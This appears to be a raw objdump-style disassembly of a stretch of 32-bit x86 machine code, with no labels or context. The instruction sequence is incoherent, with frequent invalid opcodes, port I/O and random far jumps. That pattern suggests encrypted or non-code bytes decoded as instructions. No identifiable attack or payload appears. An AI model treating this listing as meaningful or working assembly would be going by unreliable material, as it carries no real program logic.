  40b744:	and    ch,BYTE PTR [ecx+ebp*4-0x2dae433e]
  40b74b:	loope  0x40b72d
  40b74d:	sahf   
  40b74e:	test   eax,0xff6c3de9
  40b753:	es in  eax,0x2f
  40b756:	popf   
  40b757:	mov    ch,0xa9
  40b759:	adc    eax,0x17bcd60f
  40b75e:	inc    ebx
  40b75f:	pop    ss
  40b760:	mov    esi,0x1209d4da
  40b765:	call   0x58f68f11
  40b76a:	pushf  
  40b76b:	dec    esp
  40b76c:	xor    eax,0xf5d1112f
  40b771:	and    DWORD PTR [edi-0x6d8b49fc],ecx
  40b777:	xchg   DWORD PTR [edi+0x3d945cd0],esi
  40b77d:	push   0x7590e303
  40b782:	(bad)  
  40b783:	(bad)  
  40b784:	jp     0x40b777
  40b786:	fwait
  40b787:	xor    eax,0x2574a252
  40b78c:	cmp    DWORD PTR [ebp+0x2b],esp
  40b78f:	lahf   
  40b790:	inc    esp
  40b791:	addr16 in al,dx
  40b793:	inc    eax
  40b794:	mov    bl,0x4b
  40b796:	aam    0x32
  40b798:	rcr    cl,cl
  40b79a:	outs   dx,BYTE PTR ds:[esi]
  40b79b:	mov    ch,0x54
  40b79d:	pop    ebp
  40b79e:	or     eax,0x46c03a99
  40b7a3:	test   eax,0x66a9d8a4
  40b7a8:	mov    ds:0xf1a91645,eax
  40b7ad:	jl     0x40b758
  40b7af:	inc    esp
  40b7b0:	mov    bh,0x9
  40b7b2:	cmp    al,0xbb
  40b7b4:	push   es
  40b7b5:	ret    
  40b7b6:	push   cs
  40b7b7:	fdiv   DWORD PTR [edx]
  40b7b9:	in     al,dx
  40b7ba:	ret    0xe538
  40b7bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7be:	mov    cs,WORD PTR [esi+0x3]
  40b7c1:	push   0xc15da312
  40b7c6:	pop    es
  40b7c7:	addr16 push 0xffffffa9
  40b7ca:	jbe    0x40b81e
  40b7cc:	pushf  
  40b7cd:	cmp    eax,0x1f6fc775
  40b7d2:	push   esi
  40b7d3:	xor    al,0x48
  40b7d5:	or     eax,0xbe090603
  40b7da:	sbb    al,0xf1
  40b7dc:	xchg   edx,eax
  40b7dd:	push   ds
  40b7de:	jmp    0xd14e:0x463eacb3
  40b7e5:	popa   
  40b7e6:	xacquire xchg BYTE PTR [ecx+0xa0b0936],cl
  40b7ed:	mov    DWORD PTR [esi],esi
  40b7ef:	mov    ebp,0xc1dea6e3
  40b7f4:	into   
  40b7f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7f6:	xchg   edx,eax
  40b7f7:	test   eax,0x2e42166
  40b7fc:	push   edi
  40b7fd:	mov    eax,0xfce2616f
  40b802:	pop    esp
  40b803:	fistp  DWORD PTR [edi+ebx*8]
  40b806:	outs   dx,DWORD PTR ds:[esi]
  40b807:	inc    ecx
  40b808:	(bad)  
  40b809:	jp     0x40b813
  40b80b:	cmp    DWORD PTR [eax+ecx*4+0x1a],ebp
  40b80f:	and    esp,ebp
  40b811:	inc    ebp
  40b812:	clc    
  40b813:	out    dx,al
  40b814:	push   edx
  40b815:	xlat   BYTE PTR ds:[ebx]
  40b816:	add    eax,0xdeeb49c0
  40b81b:	push   ebp
  40b81c:	mov    esp,0x7ab40fb2
  40b821:	mov    ds:0xbe336f6,eax
  40b826:	jecxz  0x40b7f6
  40b828:	mov    ebp,0x7e922f2a
  40b82d:	data16 in al,dx
  40b82f:	ins    DWORD PTR es:[edi],dx
  40b830:	aaa    
  40b831:	mov    ecx,0x31a6b3ce
  40b836:	sar    bh,1
  40b838:	jp     0x40b7ea
  40b83a:	sbb    al,0x5e
  40b83c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b83d:	mov    ah,0xdb
  40b83f:	cmp    edi,ebx
  40b841:	mov    eax,ds:0xf88ff0e1
  40b846:	xchg   DWORD PTR [esi+0x4a],esp
  40b849:	mov    eax,ds:0x1c884542
  40b84e:	aad    0x63
  40b850:	jns    0x40b804
  40b852:	fmul   QWORD PTR [eiz*1-0x38dc9e5a]
  40b859:	cli    
  40b85a:	mov    esi,esp
  40b85c:	xchg   edi,eax
  40b85d:	xor    bh,BYTE PTR [eax+0x3ad81773]
  40b863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b864:	inc    edi
  40b865:	xchg   esp,eax
  40b866:	rol    BYTE PTR [ecx],1
  40b868:	mov    ebp,0x7e5502ce
  40b86d:	jle    0x40b8e3
  40b86f:	(bad)  
  40b870:	(bad)
  40b874:	cmp    esi,DWORD PTR [esp+esi*8-0x75]
  40b878:	jae    0x40b82f
  40b87a:	push   esp
  40b87b:	ja     0x40b8eb
  40b87d:	fs cdq 
  40b87f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b880:	scas   al,BYTE PTR es:[edi]
  40b881:	xor    DWORD PTR [ebx+0x10],0xaaa5c948
  40b888:	lock sub eax,0x6eabf9c7
  40b88e:	and    eax,0x269926d6
  40b893:	jmp    0x50eb:0x36a0cdf
  40b89a:	push   ss
  40b89b:	inc    ecx
  40b89c:	push   ebx
  40b89d:	aaa    
  40b89e:	lods   al,BYTE PTR ds:[esi]
  40b89f:	dec    ebp
  40b8a0:	xor    ecx,DWORD PTR [eax+0x55]
  40b8a3:	ret    0x637
  40b8a6:	test   al,0xdc
  40b8a8:	pop    esp
  40b8a9:	dec    edx
  40b8aa:	push   ds
  40b8ab:	cmp    al,0x17
  40b8ad:	daa    
  40b8ae:	or     BYTE PTR [ebx],bl
  40b8b0:	push   es
  40b8b1:	das    
  40b8b2:	into   
  40b8b3:	iret   
  40b8b4:	jp     0x40b8fc
  40b8b6:	lods   eax,DWORD PTR ds:[esi]
  40b8b7:	scas   al,BYTE PTR es:[edi]
  40b8b8:	stc    
  40b8b9:	push   0x97274e41
  40b8be:	cld    
  40b8bf:	ret    
  40b8c0:	cdq    
  40b8c1:	cmp    esp,DWORD PTR [ebp-0x6d]
  40b8c4:	dec    edx
  40b8c5:	lds    edx,FWORD PTR [esi-0x6080e7d9]
  40b8cb:	mov    ss,WORD PTR [ecx*4+0x56117023]
  40b8d2:	mov    al,ds:0x67a9319e
  40b8d7:	and    al,0xcb
  40b8d9:	cmp    eax,0x89bf8b74
  40b8de:	xor    eax,0x5f6b73c1
  40b8e3:	jle    0x40b8ff
  40b8e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8e6:	or     ecx,ebp
  40b8e8:	hlt    
  40b8e9:	inc    ebp
  40b8ea:	mov    bh,0x67
  40b8ec:	arpl   WORD PTR [edi+0x5a],bx
  40b8ef:	repz jb 0x40b8ee
  40b8f2:	fyl2x  
  40b8f4:	dec    ecx
  40b8f5:	out    0x8c,al
  40b8f7:	scas   al,BYTE PTR es:[edi]
  40b8f8:	push   edx
  40b8f9:	push   esi
  40b8fa:	gs bound eax,QWORD PTR ds:[edi-0x28]
  40b8ff:	dec    ecx
  40b900:	ficom  DWORD PTR [ecx+0x4c3f4b02]
  40b906:	lea    ebp,[edx+0x7b]
  40b909:	mov    BYTE PTR [ecx],0x72
  40b90c:	jp     0x40b8b7
  40b90e:	lahf   
  40b90f:	es sub eax,esp
  40b912:	push   ss
  40b913:	xchg   edi,eax
  40b914:	stc    
  40b915:	fwait
  40b916:	sub    al,cl
  40b918:	pusha  
  40b919:	mov    edx,0xf3efc7ae
  40b91e:	adc    edi,DWORD PTR [esi-0x65]
  40b921:	lea    edx,[eax+ebx*8]
  40b924:	into   
  40b925:	addr16 mov esi,0x462370be
  40b92b:	jg     0x40b8ef
  40b92d:	jmp    0x9da99433
  40b932:	adc    edx,DWORD PTR [eax-0x51]
  40b935:	outs   dx,DWORD PTR ds:[esi]
  40b936:	(bad)  
  40b937:	std    
  40b938:	scas   eax,DWORD PTR es:[edi]
  40b939:	mov    ds:0x3cb5cf68,al
  40b93e:	and    dl,dh
  40b940:	sub    dh,0xe6
  40b943:	aad    0x8b
  40b945:	push   ebp
  40b946:	pusha  
  40b947:	jnp    0x40b9af
  40b949:	addr16 fwait
  40b94b:	pavgw  mm1,QWORD PTR [eax-0x51]
  40b94f:	imul   edx,DWORD PTR [edx+ebx*4+0x20],0xa7927d1e
  40b957:	push   cs
  40b958:	mov    cl,0x0
  40b95a:	lods   al,BYTE PTR ds:[esi]
  40b95b:	dec    esi
  40b95c:	add    al,0x27
  40b95e:	(bad)  
  40b95f:	or     DWORD PTR [eax+0x333f9e45],eax
  40b965:	icebp  
  40b966:	jb     0x40b9a7
  40b968:	sub    dl,BYTE PTR [ebx+0x60f0ae50]
  40b96e:	repz mov dh,0x8
  40b971:	xchg   edx,eax
  40b972:	sub    BYTE PTR [ecx],dh
  40b974:	scas   al,BYTE PTR es:[edi]
  40b975:	xchg   ebp,eax
  40b976:	cli    
  40b977:	mov    ds:0x37e928ac,al
  40b97c:	gs push 0x97fb2718
  40b982:	mov    ecx,0x97e0452
  40b987:	jmp    0xa8d6:0xf7099966
  40b98e:	add    bh,ch
  40b990:	jmp    0x40b95b
  40b992:	fadd   DWORD PTR [ebx+0x30]
  40b995:	call   0x71753c90
  40b99a:	mov    ebx,0xca5d656e
  40b99f:	sar    BYTE PTR [esi+0x40],cl
  40b9a2:	inc    edx
  40b9a3:	dec    eax
  40b9a4:	sti    
  40b9a5:	sahf   
  40b9a6:	cwde   
  40b9a7:	es cli 
  40b9a9:	jb     0x40b9ad
  40b9ab:	(bad)  
  40b9ac:	out    dx,al
  40b9ad:	push   esp
  40b9ae:	inc    eax
  40b9af:	mov    ?,WORD PTR [ebx-0x66f59d28]
  40b9b5:	repz scas eax,DWORD PTR es:[edi]
  40b9b7:	daa    
  40b9b8:	shr    BYTE PTR [ecx+0x2a179eb4],1
  40b9be:	lods   eax,DWORD PTR ds:[esi]
  40b9bf:	pop    edi
  40b9c0:	add    al,0x42
  40b9c2:	mov    ecx,0xcde6180f
  40b9c7:	xor    ebp,DWORD PTR [ebx]
  40b9c9:	addr16 and eax,0xec69a06a
  40b9cf:	les    ebx,FWORD PTR [edi]
  40b9d1:	(bad)  
  40b9d2:	sbb    eax,0x2dcf39a8
  40b9d7:	(bad)  
  40b9d9:	pop    ebp
  40b9da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9db:	ja     0x40b97b
  40b9dd:	fwait
  40b9de:	out    0x57,al
  40b9e0:	mov    al,0xf7
  40b9e2:	enter  0xb160,0xde
  40b9e6:	je     0x40b9c3
  40b9e8:	mov    ds:0x371364f2,eax
  40b9ed:	pop    esp
  40b9ee:	mov    dl,0xec
  40b9f0:	sbb    al,bl
  40b9f2:	or     BYTE PTR [eax-0x6b],dl
  40b9f5:	pop    esi
  40b9f6:	call   0x2146:0xcc649f05
  40b9fd:	push   ds
  40b9fe:	ins    BYTE PTR es:[edi],dx
  40b9ff:	(bad)  
  40ba00:	std    
  40ba01:	loope  0x40b9c2
  40ba03:	(bad)  
  40ba04:	mov    dh,0xae
  40ba06:	dec    ebp
  40ba07:	add    eax,0xbff3d4e8
  40ba0c:	adc    ch,BYTE PTR [esp+ecx*4+0x38f54bd]
  40ba13:	test   al,0xa
  40ba15:	(bad)  
  40ba16:	lock scas eax,DWORD PTR es:[edi]
  40ba18:	jbe    0x40ba92
  40ba1a:	inc    ecx
  40ba1b:	in     al,0xa3
  40ba1d:	mov    ecx,0x9f8bdfa2
  40ba22:	lock imul ebx,DWORD PTR [edx+ecx*8+0x5],0x34558b18
  40ba2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba2c:	or     dl,BYTE PTR [eax]
  40ba2e:	mov    bh,0xd5
  40ba30:	dec    DWORD PTR [esi-0x53]
  40ba33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba34:	out    dx,al
  40ba35:	jno    0x40bab4
  40ba37:	mov    edx,0x75ffeaba
  40ba3c:	fld    TBYTE PTR [esp+edi*4+0x30]
  40ba40:	and    al,0xbb
  40ba42:	bound  esi,QWORD PTR [ebp+0x7f]
  40ba45:	cmp    esp,edx
  40ba47:	clc    
  40ba48:	mov    dl,cl
  40ba4a:	in     al,0x75
  40ba4c:	mov    ss,esp
  40ba4e:	mov    eax,0xc041cd36
  40ba53:	adc    eax,0x5017e4a6
  40ba58:	sahf   
  40ba59:	je     0x40ba62
  40ba5b:	hlt    
  40ba5c:	repnz mov WORD PTR [ecx+0x56],fs
  40ba60:	mov    ch,0x8b
  40ba62:	and    al,0x31
  40ba64:	retf   0xfe1f
  40ba67:	sub    ebx,DWORD PTR [ecx+0x57]
  40ba6a:	nop
  40ba6b:	jae    0x40b9f8
  40ba6d:	pop    esi
  40ba6e:	jbe    0x40ba84
  40ba70:	outs   dx,BYTE PTR ds:[esi]
  40ba71:	fsub   DWORD PTR [esi]
  40ba73:	push   edi
  40ba74:	retf   0xbfe1
  40ba77:	jb     0x40ba21
  40ba79:	iret   
  40ba7a:	xchg   DWORD PTR [ebp-0x3d967677],ebp
  40ba80:	xor    al,0xe
  40ba82:	test   esi,ebp
  40ba84:	fiadd  DWORD PTR [eax]
  40ba86:	aad    0x78
  40ba88:	pop    ecx
  40ba89:	mov    dh,0x40
  40ba8b:	(bad)  
  40ba8c:	test   eax,0x76215db8
  40ba91:	fimul  WORD PTR [ebp-0x2a]
  40ba94:	cmp    eax,0x3d291112
  40ba99:	jecxz  0x40ba3b
  40ba9b:	lods   eax,DWORD PTR ds:[esi]
  40ba9c:	inc    edi
  40ba9d:	and    BYTE PTR [ebx],cl
  40ba9f:	xchg   dl,al
  40baa1:	mov    bl,0x8f
  40baa3:	jb     0x40ba9b
  40baa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baa6:	xchg   ch,al
  40baa8:	fsub   DWORD PTR [edx+0x210aeadb]
  40baae:	adc    dl,BYTE PTR [edx-0x4d78c65f]
  40bab4:	sbb    eax,0xbbe494c6
  40bab9:	into   
  40baba:	sbb    dh,BYTE PTR [esi]
  40babc:	(bad)  
  40babe:	(bad)  [ecx-0x5c16dc98]
  40bac4:	sbb    DWORD PTR [esi-0x181648ef],ebx
  40baca:	je     0x40ba4e
  40bacc:	mov    esp,0xd52dd3e3
  40bad1:	out    0x27,eax
  40bad3:	jmp    0xadad:0xddedd401
  40bada:	xor    DWORD PTR [edx+0x36],ecx
  40badd:	(bad)  
  40badf:	loope  0x40ba83
  40bae1:	out    0x1e,al
  40bae3:	push   ecx
  40bae5:	push   es
  40bae6:	not    cl
  40bae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bae9:	cmp    eax,0x98ce3604
  40baee:	lock cmova esp,DWORD PTR [esi-0x6c]
  40baf3:	cmp    BYTE PTR ds:0x330b1a49,dl
  40baf9:	not    ah
  40bafb:	dec    edi
  40bafc:	push   esi
  40bafd:	mov    ah,0x87
  40baff:	and    ebx,DWORD PTR [eax]
  40bb01:	mov    BYTE PTR [eax],al
  40bb03:	mov    ?,WORD PTR [edx+0x27]
  40bb06:	cmp    eax,0x236d0f67
  40bb0b:	jns    0x40bb63
  40bb0d:	sub    al,BYTE PTR ds:0xdf3b55f5
  40bb13:	arpl   WORD PTR [edx+0x79],di
  40bb16:	sbb    esi,DWORD PTR [edx+0x72]
  40bb19:	xchg   esp,eax
  40bb1a:	jmp    0x433b:0xd0a9d37a
  40bb21:	pop    ss
  40bb22:	test   BYTE PTR [ecx+0x748e70ef],dl
  40bb28:	jmp    0x698f5960
  40bb2d:	lahf   
  40bb2e:	push   ebp
  40bb2f:	lods   al,BYTE PTR ds:[esi]
  40bb30:	scas   al,BYTE PTR es:[edi]
  40bb31:	xchg   esp,eax
  40bb32:	jne    0x40bae3
  40bb34:	call   FWORD PTR ds:0x23f6c560
  40bb3a:	into   
  40bb3b:	out    0x8c,al
  40bb3d:	jae    0x40bb31
  40bb3f:	mov    al,ds:0x360b759d
  40bb44:	inc    eax
  40bb45:	mov    al,ds:0x7bd28a9d
  40bb4a:	mov    esp,0x34fe3a08
  40bb4f:	cld    
  40bb50:	sub    al,0xb0
  40bb52:	mov    eax,ds:0xa699c3ef
  40bb57:	into   
  40bb58:	xor    al,0x86
  40bb5a:	(bad)  
  40bb5b:	xor    BYTE PTR [ebx-0x218eae4c],ah
  40bb61:	jnp    0x40bb5a
  40bb63:	adc    edi,ecx
  40bb65:	jno    0x40bbcf
  40bb67:	add    edx,DWORD PTR [esi-0x73064002]
  40bb6d:	aam    0x32
  40bb6f:	arpl   si,dx
  40bb71:	in     eax,dx
  40bb72:	mov    edi,0x81ed049f
  40bb77:	xchg   edi,eax
  40bb78:	inc    ebp
  40bb79:	mov    ebx,0xdb54d993
  40bb7e:	je     0x40bb09
  40bb80:	sub    BYTE PTR [edi+0x1a],0x19
  40bb84:	pop    ss
  40bb85:	xchg   BYTE PTR [ebx+0x4b],ch
  40bb88:	pop    edx
  40bb89:	jg     0x40bb15
  40bb8b:	daa    
  40bb8c:	rcl    DWORD PTR [edi-0x55],1
  40bb8f:	retf   
  40bb90:	ss push 0xffffff9a
  40bb93:	in     al,dx
  40bb94:	aam    0xad
  40bb96:	out    dx,al
  40bb97:	ja     0x40bb7c
  40bb99:	lds    esp,FWORD PTR [edi-0x751c237a]
  40bb9f:	xchg   ebx,eax
  40bba0:	out    dx,al
  40bba1:	inc    ecx
  40bba2:	mov    dh,0x10
  40bba4:	dec    eax
  40bba5:	popa   
  40bba6:	push   cs
  40bba7:	jp     0x40bb64
  40bba9:	cmp    DWORD PTR [edi-0x75],ecx
  40bbac:	cmp    eax,0xd2d4a96c
  40bbb1:	fmul   QWORD PTR [eax-0x20]
  40bbb4:	stc    
  40bbb5:	std    
  40bbb6:	xlat   BYTE PTR ds:[ebx]
  40bbb7:	add    al,BYTE PTR [ecx+ebx*4-0x69]
  40bbbb:	lahf   
  40bbbc:	xor    dl,ah
  40bbbe:	ret    0x610f
  40bbc1:	jmp    0x5ce2:0x828a17b
  40bbc8:	out    0xf2,al
  40bbca:	not    DWORD PTR [ecx+0x7abd24b8]
  40bbd0:	cmc    
  40bbd1:	pop    ecx
  40bbd2:	test   BYTE PTR [eax-0x6bf86eff],ch
  40bbd8:	jae    0x40bbaf
  40bbda:	loop   0x40bbb9
  40bbdc:	cmp    esp,edi
  40bbde:	pop    esp
  40bbdf:	sub    BYTE PTR [eax+0x24],dh
  40bbe2:	push   ecx
  40bbe3:	xchg   ebp,eax
  40bbe4:	sub    al,BYTE PTR [ecx+ebx*1-0x10ee10bf]
  40bbeb:	jmp    0xc56a2b24
  40bbf0:	popa   
  40bbf1:	push   eax
  40bbf2:	cmp    bl,BYTE PTR [ebx]
  40bbf4:	mov    edx,0x1c36b1b7
  40bbf9:	sub    BYTE PTR [ebx-0x50],0x68
  40bbfd:	enter  0x8772,0xbb
  40bc01:	xchg   esp,eax
  40bc02:	repz scas al,BYTE PTR es:[edi]
  40bc04:	dec    esp
  40bc05:	ret    0xe5b0
  40bc08:	shr    DWORD PTR ds:0x93739c08,cl
  40bc0e:	frstor [edx+0x31]
  40bc11:	push   cs
  40bc12:	and    eax,0xb1faccbb
  40bc17:	pusha  
  40bc18:	fsubr  st(1),st
  40bc1a:	mov    esp,0x50c062ed
  40bc1f:	test   BYTE PTR [ebx+0x49e7f673],al
  40bc25:	ins    BYTE PTR es:[edi],dx
  40bc26:	mov    ds:0x8439aa2e,eax
  40bc2b:	cmp    eax,0x83b5a338
  40bc30:	aas    
  40bc31:	addr16 std 
  40bc33:	dec    esi
  40bc34:	(bad)  
  40bc36:	mov    ds:0x50790491,eax
  40bc3b:	xor    edx,eax
  40bc3d:	hlt    
  40bc3e:	int3   
  40bc3f:	ja     0x40bc68
  40bc41:	mov    ecx,0xe0d48083
  40bc46:	sahf   
  40bc47:	pop    edi
  40bc48:	and    al,0x59
  40bc4a:	gs mov esp,esp
  40bc4d:	(bad)  
  40bc4e:	jl     0x40bcb5
  40bc50:	jne    0x40bc0e
  40bc52:	enter  0x159e,0xe1
  40bc56:	test   BYTE PTR [eax+0x16ea9023],dh
  40bc5c:	mov    ah,0xfd
  40bc5e:	jmp    FWORD PTR [edi-0x59]
  40bc61:	push   ebp
  40bc62:	pop    ebx
  40bc63:	jg     0x40bcc4
  40bc65:	mov    dl,0x68
  40bc67:	mov    al,0x61
  40bc69:	(bad)  
  40bc6a:	out    0x29,eax
  40bc6c:	sbb    BYTE PTR [esi+0x701545e5],ch
  40bc72:	retf   
  40bc73:	jg     0x40bc12
  40bc75:	les    esp,FWORD PTR [edx-0x1d]
  40bc78:	rcl    DWORD PTR [edx-0x1f5e2fd6],cl
  40bc7e:	dec    esi
  40bc7f:	test   ebx,0xd256e7a1
  40bc85:	aaa    
  40bc86:	jge    0x40bcc7
  40bc88:	mov    ?,WORD PTR [ecx]
  40bc8a:	xchg   esi,eax
  40bc8b:	dec    esi
  40bc8c:	frstor [edx]
  40bc8e:	fwait
  40bc8f:	mov    WORD PTR [ebp+0x38f877ce],es
  40bc95:	and    dh,BYTE PTR [edi]
  40bc97:	and    esp,DWORD PTR [ecx+0x78b782d]
  40bc9d:	fimul  WORD PTR [edi+0x2bc3cd2d]
  40bca3:	inc    edi
  40bca4:	repnz adc BYTE PTR [eax+0x41],dh
  40bca8:	mov    al,0x80
  40bcaa:	pop    ecx
  40bcab:	push   cs
  40bcac:	aam    0x25
  40bcae:	imul   ebp,ecx,0xeab13f88
  40bcb4:	and    BYTE PTR [ebx],dh
  40bcb6:	mov    DWORD PTR [ebx-0x45a841ea],edi
  40bcbc:	or     ecx,DWORD PTR ds:0xc324d31b
  40bcc2:	mov    dh,0x3c
  40bcc4:	xchg   edi,eax
  40bcc5:	leave  
  40bcc6:	lock test BYTE PTR [esi-0x16],bh
  40bcca:	mov    cl,0xa4
  40bccc:	xchg   BYTE PTR [ebx+0xd735018],bh
  40bcd2:	aaa    
  40bcd3:	stos   BYTE PTR es:[edi],al
  40bcd4:	mov    al,0xd7
  40bcd6:	jb     0x40bc5d
  40bcd8:	mov    BYTE PTR [ecx+edx*2-0x75769116],dh
  40bcdf:	clc    
  40bce0:	xchg   edx,eax
  40bce1:	jb     0x40bce0
  40bce3:	test   DWORD PTR [edx-0x6b939ef2],ebp
  40bce9:	in     eax,0x2b
  40bceb:	fs mov ch,0xe1
  40bcee:	fnstcw WORD PTR cs:[ebx]
  40bcf1:	(bad)  
  40bcf2:	clc    
  40bcf3:	jne    0x40bcb9
  40bcf5:	cli    
  40bcf6:	dec    esp
  40bcf7:	inc    esi
  40bcf8:	xchg   ecx,eax
  40bcf9:	fwait
  40bcfa:	mov    esi,0x31286ca1
  40bcff:	outs   dx,BYTE PTR ds:[esi]
  40bd00:	xchg   ebx,eax
  40bd01:	ds mov cl,0x89
  40bd04:	push   ebx
  40bd05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd07:	cmp    DWORD PTR es:[ebp+0x2b939e47],ebx
  40bd0e:	iret   
  40bd0f:	fiadd  DWORD PTR [esi-0x4e6fe856]
  40bd15:	pop    es
  40bd16:	aas    
  40bd17:	pop    esi
  40bd18:	rol    BYTE PTR [ebx+ebp*8+0x2c0ce6bb],0x45
  40bd20:	adc    DWORD PTR [ecx],edi
  40bd22:	ins    BYTE PTR es:[edi],dx
  40bd23:	mul    DWORD PTR [esi+esi*8+0x12]
  40bd27:	(bad)  
  40bd28:	pop    ds
  40bd29:	scas   al,BYTE PTR es:[edi]
  40bd2a:	pop    ecx
  40bd2b:	(bad)
  40bd2e:	jae    0x40bd12
  40bd30:	sbb    edx,DWORD PTR [edi+0x57]
  40bd33:	xchg   esp,eax
  40bd34:	dec    ecx
  40bd35:	xor    ch,bl
  40bd37:	adc    DWORD PTR [ebx+edx*8+0x3dc25d77],0x126f282a
  40bd42:	mov    al,ds:0xab07e3c7
  40bd47:	xchg   edx,eax
  40bd48:	dec    ebp
  40bd49:	test   DWORD PTR [eax+0x45f2af67],0x44892b3d
  40bd53:	ret    0x2d18
  40bd56:	sbb    dh,BYTE PTR [edx]
  40bd58:	(bad)  
  40bd59:	repz retf 
  40bd5b:	add    ah,ah
  40bd5d:	sar    BYTE PTR [ebx-0x56],1
  40bd60:	test   eax,0x1e4d79f7
  40bd65:	in     al,0x7e
  40bd67:	cld    
  40bd68:	test   BYTE PTR [eax+0x5415bb92],ah
  40bd6e:	fs ins BYTE PTR es:[edi],dx
  40bd70:	inc    ecx
  40bd71:	in     eax,0x7d
  40bd73:	adc    bh,0xff
  40bd76:	int3   
  40bd77:	jmp    0x40bdcd
  40bd79:	sub    BYTE PTR [eax+esi*2+0x41],0x6b
  40bd7e:	mov    dh,0x2d
  40bd80:	fisubr DWORD PTR [edx]
  40bd82:	test   DWORD PTR [eax-0x156664d3],ebx
  40bd88:	adc    dh,dl
  40bd8a:	mov    al,0x36
  40bd8c:	sbb    eax,0x37ec3cc3
  40bd91:	sbb    ah,BYTE PTR cs:[ebp+ecx*2+0x4934ff16]
  40bd99:	repz inc eax
  40bd9b:	pop    eax
  40bd9c:	leave  
  40bd9d:	mov    ecx,0xfbb22eab
  40bda2:	xchg   BYTE PTR [eax-0x52],dl
  40bda5:	(bad)  
  40bda6:	stc    
  40bda7:	cpuid  
  40bda9:	mov    ds:0xe11f1ac9,al
  40bdae:	sti    
  40bdaf:	pop    edi
  40bdb0:	xor    eax,0xc43f3d2a
  40bdb5:	test   eax,0x139c2b1
  40bdba:	(bad)  
  40bdbc:	icebp  
  40bdbd:	or     eax,0xa0762c03
  40bdc2:	add    al,0xb7
  40bdc4:	dec    ebx
  40bdc5:	xchg   esp,eax
  40bdc6:	shl    BYTE PTR [eax+0xa],cl
  40bdc9:	push   ebp
  40bdca:	sbb    ebp,DWORD PTR [esi+eax*1-0x63]
  40bdce:	cwde   
  40bdcf:	cmp    eax,0x65199e84
  40bdd4:	iret   
  40bdd5:	cmp    al,0xb
  40bdd7:	cmp    eax,0xc9799843
  40bddc:	xchg   esi,eax
  40bddd:	sbb    BYTE PTR [edi-0x2d],ah
  40bde0:	mov    eax,0x6722acd1
  40bde5:	xchg   DWORD PTR [eax],edi
  40bde7:	ins    BYTE PTR es:[edi],dx
  40bde8:	add    DWORD PTR ds:0xf89f29aa,edx
  40bdee:	bound  edi,QWORD PTR [ebx]
  40bdf0:	sti    
  40bdf1:	int    0xc0
  40bdf3:	repnz cmp DWORD PTR [ebx+0x4e7c9b86],ecx
  40bdfa:	fdivr  QWORD PTR [ebx]
  40bdfc:	xor    edi,DWORD PTR [ecx-0x7d]
  40bdff:	mov    esp,0xf5310cf0
  40be04:	loope  0x40be3d
  40be06:	xchg   esi,eax
  40be07:	mov    ah,0x6c
  40be09:	ja     0x40be30
  40be0b:	mov    WORD PTR [ebp+0x3ed84831],ds
  40be11:	and    edx,edi
  40be13:	(bad)  
  40be14:	and    BYTE PTR [eax],dl
  40be16:	ja     0x40bdb7
  40be18:	hlt    
  40be19:	push   ebx
  40be1a:	mov    WORD PTR [edi+0x36],cs
  40be1d:	(bad)  
  40be1e:	mov    ?,WORD PTR [ebx+0x5352eed6]
  40be24:	push   ss
  40be25:	xor    ebx,DWORD PTR [ebp+esi*8-0x688b0314]
  40be2c:	sub    al,0x3
  40be2e:	sbb    ch,BYTE PTR [ecx]
  40be30:	jg     0x40bea9
  40be32:	pop    esi
  40be33:	sbb    ecx,edi
  40be35:	mov    DWORD PTR ds:0x148590bc,esi
  40be3b:	xchg   edx,eax
  40be3c:	repnz add edx,DWORD PTR [eax-0x9d7f98c]
  40be43:	pusha  
  40be44:	jae    0x40be61
  40be46:	mov    ds,WORD PTR [esi-0x53153ca8]
  40be4c:	lods   eax,DWORD PTR ds:[esi]
  40be4d:	adc    al,0x8d
  40be4f:	in     eax,0x36
  40be51:	push   ecx
  40be52:	and    ebp,ebx
  40be54:	inc    eax
  40be55:	xchg   ecx,eax
  40be56:	add    esi,ebp
  40be58:	nop
  40be59:	xor    al,0xc
  40be5b:	ret    
  40be5c:	xchg   ebx,eax
  40be5d:	cmp    eax,0x3cacc72
  40be62:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40be64:	jle    0x40be73
  40be66:	js     0x40be8c
  40be68:	into   
  40be69:	push   ds
  40be6a:	inc    esi
  40be6b:	sbb    al,0xbd
  40be6d:	pop    es
  40be6e:	fnstsw ax
  40be70:	loop   0x40bedb
  40be72:	arpl   sp,si
  40be74:	pop    ebx
  40be75:	or     eax,0x6249d2fb
  40be7a:	addr16 jge 0x40be2d
  40be7d:	mov    edi,0xd3e7eb8d
  40be82:	lods   eax,DWORD PTR ds:[esi]
  40be83:	in     al,0x25
  40be85:	mov    DWORD PTR [ebx+edi*8-0x675b3b24],ecx
  40be8c:	inc    esi
  40be8d:	jnp    0x40bec2
  40be8f:	aad    0x9d
  40be91:	mov    ds:0x654678b1,eax
  40be96:	add    ah,BYTE PTR [eax-0x467deb63]
  40be9c:	pop    edx
  40be9d:	loopne 0x40bedd
  40be9f:	and    al,0x81
  40bea1:	inc    ebp
  40bea2:	inc    ecx
  40bea3:	imul   esp,DWORD PTR ds:0x9960ed44,0xa165ed26
  40bead:	adc    dh,bh
  40beaf:	dec    eax
  40beb0:	lods   eax,DWORD PTR ds:[esi]
  40beb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beb2:	(bad)  
  40beb3:	pusha  
  40beb4:	dec    ebp
  40beb5:	and    DWORD PTR ds:0x61684ce3,esp
  40bebb:	dec    edi
  40bebc:	or     al,ch
  40bebe:	lds    esp,FWORD PTR [ebp-0x7981f399]
  40bec4:	imul   edx,DWORD PTR [ebx+eiz*8+0x700572a6],0x38544775
  40becf:	mov    edi,0x28776c19
